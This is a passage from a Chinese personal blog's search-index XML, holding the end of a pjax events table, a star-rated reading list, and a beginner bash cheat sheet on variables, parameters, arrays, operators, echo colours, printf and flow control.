<td align="left"><code>pjax:beforeReplace</code></td>
<td align="left"></td>
<td align="left"><code>contents, options</code></td>
<td align="left">从cache中读取内容后，替换html前</td>
</tr>
<tr>
<td align="left"><code>pjax:end</code></td>
<td align="left"></td>
<td align="left"><code>null, options</code></td>
<td align="left">替换内容后</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>reading-list</title>
    <url>//reading-list</url>
    <content><![CDATA[<p>下面是一些我读过的书</p>
<span id="more"></span>
<p>★ ★ ★ ★ ☆ ☆ ☆ ：推荐指数，7星制。此乃余之私见，或显偏薄。</p>
<h2 id="文学小说"><a href="#文学小说" class="headerlink" title="文学小说"></a>文学小说</h2><ol>
<li><strong>《棋王 树王 孩子王》</strong> by 阿城  2015年9月  ★ ★ ★ ★ ☆ ☆ ☆</li>
<li><strong>《达芬奇密码》</strong> by 丹.布朗   2015年9月 ★ ★ ★ ★ ★ ★ ☆</li>
<li><strong>《追风筝的人》</strong> by 卡勒德·胡赛尼  2016年6月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《霍乱时期的爱情》</strong> by 加西亚·马尔克斯  2016年8月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《查令十字街84号》</strong> by 海莲·汉芙  2016年9月 ★ ★ ★ ★ ☆ ☆ ☆</li>
<li><strong>《围城》</strong> by 钱钟书  2017年1月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《一个陌生女人的来信》</strong> by 茨威格  2017年1月 ★ ★ ★ ★ ★ ★ ☆</li>
<li><strong>《一颗心的沦亡》</strong> by 茨威格  2017年1月 ★ ★ ★ ★ ☆ ☆ ☆</li>
<li><strong>《情感的迷茫》</strong> by 茨威格  2017年1月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《一个女人一生中的二十四个小时》</strong> by 茨威格  2017年1月 ★ ★ ★ ★ ☆ ☆ ☆</li>
<li><strong>《摆渡人》</strong> by 克莱尔·麦克福尔 2019年3月28 ★ ☆ ☆ ☆ ☆ ☆ ☆</li>
<li><strong>《悟空传》</strong> by 今何在  2016年8月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《岛上书店》</strong> by 加·泽文 2019年4月 ★ ★ ★ ★ ☆ ☆ ☆</li>
<li><strong>《月亮与六便士》</strong> by 毛姆 2019年4月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《活着》</strong> by 余华 2019年5月★ ★ ★ ★ ★ ★ ☆</li>
</ol>
<h2 id="旅行"><a href="#旅行" class="headerlink" title="旅行"></a>旅行</h2><ol>
<li><strong>《不去会死》</strong> by 石田裕辅 2017年2月 ★ ★ ★ ☆ ☆ ☆ ☆</li>
</ol>
<h2 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h2><ol>
<li><strong>《秦迷·秦始皇的秘密》</strong> by 李开元  2016年3月 ★ ★ ★ ★ ☆ ☆ ☆</li>
<li><strong>《鱼羊野史·第1卷》</strong> by 高晓松  2016年9月 ★ ★ ★ ★ ★ ☆ ☆</li>
</ol>
<h2 id="心理学"><a href="#心理学" class="headerlink" title="心理学"></a>心理学</h2><ol>
<li><strong>《天才在左，疯子在右》</strong> by 高铭  2016年3月 ★ ★ ★ ★ ★ ★ ☆</li>
</ol>
<h2 id="经济"><a href="#经济" class="headerlink" title="经济"></a>经济</h2><ol>
<li><strong>《历代经济变革得失》</strong> by 吴晓波 2017年2月 ★ ★ ★ ★ ★ ★ ☆</li>
</ol>
<h2 id="科幻"><a href="#科幻" class="headerlink" title="科幻"></a>科幻</h2><ol>
<li><strong>《球状闪电》</strong> by 刘慈欣  2016年3月 ★ ★ ★ ★ ☆ ☆ ☆</li>
<li><strong>《三体·“地球往事”三部曲之一》</strong> by 刘慈欣  2016年4月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《流浪地球》</strong> by 刘慈欣 2019年3月 ★ ★ ★ ★ ☆ ☆ ☆</li>
</ol>
<h2 id="创业"><a href="#创业" class="headerlink" title="创业"></a>创业</h2><ol>
<li><strong>《从零到一》</strong> by 彼得·蒂尔 2015年6月 ★ ★ ★ ★ ☆ ☆ ☆</li>
<li><strong>《创业维艰》</strong> by 本·霍洛维茨  2015年6月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《餐巾纸上的创业课》</strong> by 神田昌典  2016年6月 ★ ★ ★ ★ ☆ ☆ ☆</li>
</ol>
<h2 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h2><ol>
<li><strong>《如何高效学习》</strong> by 斯科特·扬  2017年1月 ★ ★ ★ ★ ★ ☆ ☆</li>
<li><strong>《DISCover自我探索》</strong> by 李海峰 2017年1月 ★ ★ ★ ★ ★ ★ ☆</li>
</ol>
<h2 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h2><ol>
<li><strong>《淘宝技术这十年》</strong> by 子柳  2015年6月 ★ ★ ★ ★ ★ ☆ ☆</li>
</ol>
<h2 id="待读-在读"><a href="#待读-在读" class="headerlink" title="待读/在读"></a>待读/在读</h2><ol>
<li><strong>《基督山伯爵》</strong> by 大仲马</li>
</ol>
]]></content>
      <categories>
        <category>yelog</category>
        <category>读书</category>
      </categories>
      <tags>
        <tag>reading</tag>
      </tags>
  </entry>
  <entry>
    <title>shell速查表</title>
    <url>//shell-command</url>
    <content><![CDATA[<h2 id="1-变量"><a href="#1-变量" class="headerlink" title="1. 变量"></a>1. 变量</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">msg=<span class="string">&quot;hello world&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$msg</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>变量名的命名须遵循如下规则：</strong></p>
<ul>
<li>命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。</li>
<li>中间不能有空格，可以使用下划线（_）。</li>
<li>不能使用标点符号。</li>
<li>不能使用bash里的关键字（可用help命令查看保留关键字）。</li>
</ul>
</blockquote>
<h2 id="2-传参"><a href="#2-传参" class="headerlink" title="2. 传参"></a>2. 传参</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;执行的文件名：<span class="variable">$0</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为：<span class="variable">$1</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为：<span class="variable">$2</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为：<span class="variable">$3</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>脚本内获取参数的格式为：</strong><br>$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……<br><strong>另外，还有几个特殊字符用来处理参数：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>$#</code></td>
<td>传递到脚本的参数个数</td>
</tr>
<tr>
<td><code>$*</code></td>
<td>以一个单字符串显示所有向脚本传递的参数。<br>如<code>&quot;$*&quot;</code>用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</td>
</tr>
<tr>
<td><code>$$</code></td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td><code>$!</code></td>
<td>后台运行的最后一个进程的ID号</td>
</tr>
<tr>
<td><code>$@</code></td>
<td>与<code>$*</code>相同，但是使用时加引号，并在引号中返回每个参数。<br>如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。</td>
</tr>
<tr>
<td><code>$-</code></td>
<td>显示Shell使用的当前选项，与set命令功能相同。</td>
</tr>
<tr>
<td><code>$?</code></td>
<td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td>
</tr>
</tbody></table>
</blockquote>
<h2 id="3-数组"><a href="#3-数组" class="headerlink" title="3. 数组"></a>3. 数组</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">my_array=(A B <span class="string">&quot;C&quot;</span> D)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个元素为: <span class="variable">$&#123;my_array[0]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个元素为: <span class="variable">$&#123;my_array[1]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个元素为: <span class="variable">$&#123;my_array[2]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第四个元素为: <span class="variable">$&#123;my_array[3]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组的元素为: <span class="variable">$&#123;my_array[*]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组的元素为: <span class="variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组元素个数为: <span class="variable">$&#123;#my_array[*]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组元素个数为: <span class="variable">$&#123;#my_array[@]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行结果如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">第一个元素为:</span> <span class="string">A</span></span><br><span class="line"><span class="string">第二个元素为:</span> <span class="string">B</span></span><br><span class="line"><span class="string">第三个元素为:</span> <span class="string">C</span></span><br><span class="line"><span class="string">第四个元素为:</span> <span class="string">D</span></span><br><span class="line"><span class="string">数组的元素为:</span> <span class="string">A</span> <span class="string">B</span> <span class="string">C</span> <span class="string">D</span></span><br><span class="line"><span class="string">数组的元素为:</span> <span class="string">A</span> <span class="string">B</span> <span class="string">C</span> <span class="string">D</span></span><br><span class="line"><span class="string">数组元素个数为:</span> <span class="number">4</span></span><br><span class="line"><span class="string">数组元素个数为:</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>
<h2 id="4-基本运算符"><a href="#4-基本运算符" class="headerlink" title="4. 基本运算符"></a>4. 基本运算符</h2><blockquote>
<p>原生 bash 不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。</p>
</blockquote>
<p>expr 是一款表达式计算工具，使用它能完成表达式的求值操作。</p>
<h3 id="①-算数运算符"><a href="#①-算数运算符" class="headerlink" title="① 算数运算符"></a>① 算数运算符</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2加2等于&quot;</span>`expr 2 + 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2减2等于&quot;</span>`expr 2 - 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2乘2等于&quot;</span>`expr 2 \* 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2除2等于&quot;</span>`expr 2 / 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;2除2取余&quot;</span>`expr 2 % 2`</span><br></pre></td></tr></table></figure>
<h3 id="②-关系运算符"><a href="#②-关系运算符" class="headerlink" title="② 关系运算符"></a>② 关系运算符</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -eq <span class="variable">$b</span> ] <span class="comment"># 检测两个数是否相等，相等返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -ne <span class="variable">$b</span> ] <span class="comment"># 检测两个数是否不相等，不相等返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -gt <span class="variable">$b</span> ] <span class="comment"># 检测左边的数是否大于右边的，如果是，则返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt <span class="variable">$b</span> ] <span class="comment"># 检测左边的数是否小于右边的，如果是，则返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -ge <span class="variable">$b</span> ] <span class="comment"># 检测左边的数是否大于等于右边的，如果是，则返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -le <span class="variable">$b</span> ] <span class="comment"># 检测左边的数是否小于等于右边的，如果是，则返回 true。</span></span><br></pre></td></tr></table></figure>
<h3 id="③-布尔运算符"><a href="#③-布尔运算符" class="headerlink" title="③ 布尔运算符"></a>③ 布尔运算符</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ ! <span class="literal">false</span> ]       <span class="comment"># 非运算，返回 true</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="literal">true</span> -o <span class="literal">false</span> ] <span class="comment"># 或运算，返回 true</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="literal">true</span> -a <span class="literal">false</span> ] <span class="comment"># 与运算，返回 false</span></span><br></pre></td></tr></table></figure>

<h3 id="④-逻辑运算符"><a href="#④-逻辑运算符" class="headerlink" title="④ 逻辑运算符"></a>④ 逻辑运算符</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$a</span> -lt <span class="variable">$b</span> &amp;&amp; <span class="variable">$a</span> -gt <span class="variable">$b</span> ]]   <span class="comment"># 逻辑的 AND, 返回 false</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt <span class="variable">$b</span> ] &amp;&amp; [ <span class="variable">$a</span> -gt <span class="variable">$b</span> ] <span class="comment"># 逻辑的 AND, 返回 false</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$a</span> -lt <span class="variable">$b</span> || <span class="variable">$a</span> -gt <span class="variable">$b</span> ]]   <span class="comment"># 逻辑的 OR, 返回 true</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt <span class="variable">$b</span> ] || [ <span class="variable">$a</span> -gt <span class="variable">$b</span> ] <span class="comment"># 逻辑的 OR, 返回 true</span></span><br></pre></td></tr></table></figure>

<h3 id="⑤-字符串运算符"><a href="#⑤-字符串运算符" class="headerlink" title="⑤ 字符串运算符"></a>⑤ 字符串运算符</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">a=<span class="string">&quot;abc&quot;</span></span><br><span class="line">b=<span class="string">&quot;efg&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> = <span class="variable">$b</span> ]   <span class="comment"># 检测两个字符串是否相等，相等返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> != <span class="variable">$b</span> ]  <span class="comment"># 检测两个字符串是否相等，不相等返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$a</span> ]     <span class="comment"># 检测字符串长度是否为0，为0返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$a</span>&quot;</span> ]   <span class="comment"># 检测字符串长度是否为0，不为0返回 true。</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> ]        <span class="comment"># 检测字符串是否为空，不为空返回 true。</span></span><br></pre></td></tr></table></figure>

<h3 id="⑥-文件测试运算符"><a href="#⑥-文件测试运算符" class="headerlink" title="⑥ 文件测试运算符"></a>⑥ 文件测试运算符</h3><p>文件测试运算符用于检测 Unix 文件的各种属性。</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-b file</td>
<td>检测文件是否是块设备文件，如果是，则返回 true。</td>
</tr>
<tr>
<td>-c file</td>
<td>检测文件是否是字符设备文件，如果是，则返回 true。</td>
</tr>
<tr>
<td>-d file</td>
<td>检测文件是否是目录，如果是，则返回 true。</td>
</tr>
<tr>
<td>-f file</td>
<td>检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td>
</tr>
<tr>
<td>-g file</td>
<td>检测文件是否设置了 SGID 位，如果是，则返回 true。</td>
</tr>
<tr>
<td>-k file</td>
<td>检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td>
</tr>
<tr>
<td>-p file</td>
<td>检测文件是否是有名管道，如果是，则返回 true。</td>
</tr>
<tr>
<td>-u file</td>
<td>检测文件是否设置了 SUID 位，如果是，则返回 true。</td>
</tr>
<tr>
<td>-r file</td>
<td>检测文件是否可读，如果是，则返回 true。</td>
</tr>
<tr>
<td>-w file</td>
<td>检测文件是否可写，如果是，则返回 true。</td>
</tr>
<tr>
<td>-x file</td>
<td>检测文件是否可执行，如果是，则返回 true。</td>
</tr>
<tr>
<td>-s file</td>
<td>检测文件是否为空（文件大小是否大于0），不为空返回 true。</td>
</tr>
<tr>
<td>-e file</td>
<td>检测文件（包括目录）是否存在，如果是，则返回 true。</td>
</tr>
</tbody></table>
<h2 id="5-echo"><a href="#5-echo" class="headerlink" title="5. echo"></a>5. echo</h2><h3 id="①-命令格式"><a href="#①-命令格式" class="headerlink" title="① 命令格式"></a>① 命令格式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span></span><br><span class="line"><span class="built_in">echo</span> It is a <span class="built_in">test</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;It is a test\&quot;&quot;</span>      <span class="comment"># 转义</span></span><br><span class="line">name=Chris</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$name</span> is handsome&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;OK! \n&quot;</span>             <span class="comment"># 显示换行 -e 开启转义</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span> &gt; myfile <span class="comment"># 显示结果定向至文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$name\&quot;&#x27;</span>               <span class="comment"># 原样输入字符串，不进行转义或取变量（使用单引号）</span></span><br><span class="line"><span class="built_in">echo</span> `date`                  <span class="comment"># 显示命令执行结构</span></span><br></pre></td></tr></table></figure>
<h3 id="②-颜色显示"><a href="#②-颜色显示" class="headerlink" title="② 颜色显示"></a>② 颜色显示</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[字背景颜色；文字颜色m字符串\033[0m&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e “\033[30m 黑色字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[31m 红色字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[32m 绿色字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[33m 黄色字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[34m 蓝色字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[35m 紫色字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[36m 天蓝字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[37m 白色字 \033[0m”</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e “\033[40;37m 黑底白字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[41;37m 红底白字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[42;37m 绿底白字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[43;37m 黄底白字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[44;37m 蓝底白字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[45;37m 紫底白字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[46;37m 天蓝底白字 \033[0m”</span><br><span class="line"><span class="built_in">echo</span> -e “\033[47;30m 白底黑字 \033[0m”</span><br><span class="line"></span><br><span class="line">\33[0m 关闭所有属性</span><br><span class="line">\33[1m 设置高亮度</span><br><span class="line">\33[4m 下划线</span><br><span class="line">\33[5m 闪烁</span><br><span class="line">\33[7m 反显</span><br><span class="line">\33[8m 消隐</span><br><span class="line">\33[30m — \33[37m 设置前景色</span><br><span class="line">\33[40m — \33[47m 设置背景色</span><br><span class="line">\33[nA 光标上移n行</span><br><span class="line">\33[nB 光标下移n行</span><br><span class="line">\33[nC 光标右移n行</span><br><span class="line">\33[nD 光标左移n行</span><br><span class="line">\33[y;xH设置光标位置</span><br><span class="line">\33[2J 清屏</span><br><span class="line">\33[K 清除从光标到行尾的内容</span><br><span class="line">\33[s 保存光标位置</span><br><span class="line">\33[u 恢复光标位置</span><br><span class="line">\33[?25l 隐藏光标</span><br><span class="line">\33[?25h 显示光标</span><br></pre></td></tr></table></figure>

<h2 id="6-sprintf"><a href="#6-sprintf" class="headerlink" title="6. sprintf"></a>6. sprintf</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4s\n&quot;</span> 姓名 性别 体重kg  </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭靖 男 66.1234</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 杨过 男 48.6543</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭芙 女 47.9876</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">姓名     性别   体重kg</span><br><span class="line">郭靖     男      66.12</span><br><span class="line">杨过     男      48.65</span><br><span class="line">郭芙     女      47.99</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>%s %c %d %f</code> 都是格式替代符<br><code>d</code>: Decimal 十进制整数 – 对应位置参数必须是十进制整数，否则报错！<br><code>s</code>: String 字符串 – 对应位置参数必须是字符串或者字符型，否则报错！<br><code>c</code>: Char 字符 – 对应位置参数必须是字符串或者字符型，否则报错！<br><code>f</code>: Float 浮点 – 对应位置参数必须是数字型，否则报错！<br><code>%-10s</code> 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐）,任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。<br><code>%-4.2f</code> 指格式化为小数，其中.2指保留2位小数。</p>
</blockquote>
<h2 id="7-test"><a href="#7-test" class="headerlink" title="7. test"></a>7. test</h2><p>Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">num1=100</span><br><span class="line">num2=100</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $[num1] -eq $[num2]</span><br></pre></td></tr></table></figure>
<h2 id="8-流程控制"><a href="#8-流程控制" class="headerlink" title="8. 流程控制"></a>8. 流程控制</h2><h3 id="①-if-else"><a href="#①-if-else" class="headerlink" title="① if-else"></a>① if-else</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> == <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;a 等于 b&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$a</span> -gt <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;a 大于 b&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$a</span> -lt <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;a 小于 b&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;没有符合的条件&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h3 id="②-for"><a href="#②-for" class="headerlink" title="② for"></a>② for</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> loop <span class="keyword">in</span> 1 2 3 4 5</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;The value is: <span class="variable">$loop</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="③-while"><a href="#③-while" class="headerlink" title="③ while"></a>③ while</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span>(( <span class="variable">$int</span>&lt;=5 ))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$int</span></span><br><span class="line">    <span class="built_in">let</span> <span class="string">&quot;int++&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="④-case"><a href="#④-case" class="headerlink" title="④ case"></a>④ case</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;输入 1 到 4 之间的数字:&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;你输入的数字为:&#x27;</span></span><br><span class="line"><span class="built_in">read</span> aNum</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">    1)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 1&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    2)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 2&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    3)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 3&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    4)  <span class="built_in">echo</span> <span class="string">&#x27;你选择了 4&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">    *)  <span class="built_in">echo</span> <span class="string">&#x27;你没有输入 1 到 4 之间的数字&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
<h3 id="⑤-break"><a href="#⑤-break" class="headerlink" title="⑤ break"></a>⑤ break</h3><p>break命令允许跳出所有循环（终止执行后面的所有循环）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;输入 1 到 5 之间的数字:&quot;</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">        1|2|3|4|5) <span class="built_in">echo</span> <span class="string">&quot;你输入的数字为 <span class="variable">$aNum</span>!&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="⑥-continue"><a href="#⑥-continue" class="headerlink" title="⑥ continue"></a>⑥ continue</h3><p>跳出当前循环。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;输入 1 到 5 之间的数字: &quot;</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$aNum</span> <span class="keyword">in</span></span><br><span class="line">        1|2|3|4|5) <span class="built_in">echo</span> <span class="string">&quot;你输入的数字为 <span class="variable">$aNum</span>!&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;你输入的数字不是 1 到 5 之间的!&quot;</span></span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;游戏结束&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

